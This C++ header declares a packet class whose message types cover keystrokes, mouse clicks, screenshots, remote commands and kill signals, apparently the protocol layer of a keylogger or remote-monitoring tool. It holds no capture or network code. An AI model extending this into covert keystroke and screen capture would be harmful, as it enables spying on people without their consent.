#ifndef _APACKET_HPP_
# define _APACKET_HPP_

# include <iostream>
# include <sstream>
# include <string>
# include <vector>
# include <stdexcept>
# include <cstdint>

# include <ctime>

# include "IReadable.hpp"

class APacket
{
public:
    enum class PacketType
    {
        KEYSTROKES = 1,
        MOUSECLICK = 2,
        COMMANDRESPONSE = 3,
        SCREENSHOTRESPONSE = 4,
        KILLRESPONSE = 5,
        COMMAND = 10,
        SHORTRESPONSE = 11,
        SCREENSHOT = 12,
        KILL = 13,
    };

public:
    APacket(PacketType type);
    virtual ~APacket();
    
    std::vector<uint8_t> to_bytes() const;
    void to_readable(IReadable &parser) const;
    void from_bytes(const std::vector<uint8_t> &bytes);
    void from_readable(std::string &data, IReadable &parser);

protected:
    virtual std::vector<uint8_t> to_bytes_body() const = 0;
    virtual void to_readable_body(IReadable &parser) const = 0;
    virtual void from_bytes_body(const std::vector<uint8_t> &bytes) = 0;
    virtual void from_readable_body(IReadable &parser) = 0;

    template <typename T>
    void fill_bytes(std::vector<uint8_t> &bytes, T nb) const
    {
        auto it = bytes.end();

        for (std::size_t i = 0;i < sizeof(T);++i)
        {
            it = bytes.insert(it, (nb & 0xFF));
            nb = nb >> 8;
        }
    }
    
    template <typename T>
    void get_bytes(const std::vector<uint8_t> &bytes, std::size_t &pos, T &nb) const
    {
        std::size_t i = 0;
        
        for (;i < sizeof(T) && pos + i != bytes.size();++i)
            nb = ((nb << 8) | bytes[pos + i]);
        pos += i;
        if (pos < sizeof(T) + 1)
            throw std::invalid_argument("Error while parse packet");
    }

    uint8_t          _type;
};

#endif
